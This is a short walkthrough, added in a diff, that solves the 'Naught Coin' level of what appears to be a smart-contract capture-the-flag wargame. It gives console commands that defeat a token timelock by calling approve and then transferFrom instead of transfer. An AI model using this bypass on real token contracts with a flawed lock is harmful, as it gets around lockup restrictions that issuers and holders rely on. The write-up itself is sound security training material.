@@ -1,0 +1,5 @@
+How to pwn Naught Coin:
+
+1) Approve all your tokens to be spent by running `await contract.approve(player,'1000000000000000000000000')` on the dev console
+2) Transfer all your tokens to a random address by calling `await contract.transferFrom(player, '0x8F693C0BDCCA2EB71e084Fa808e23b0298ad86Eb', '1000000000000000000000000')`
+3) Confirm you now have 0 tokens
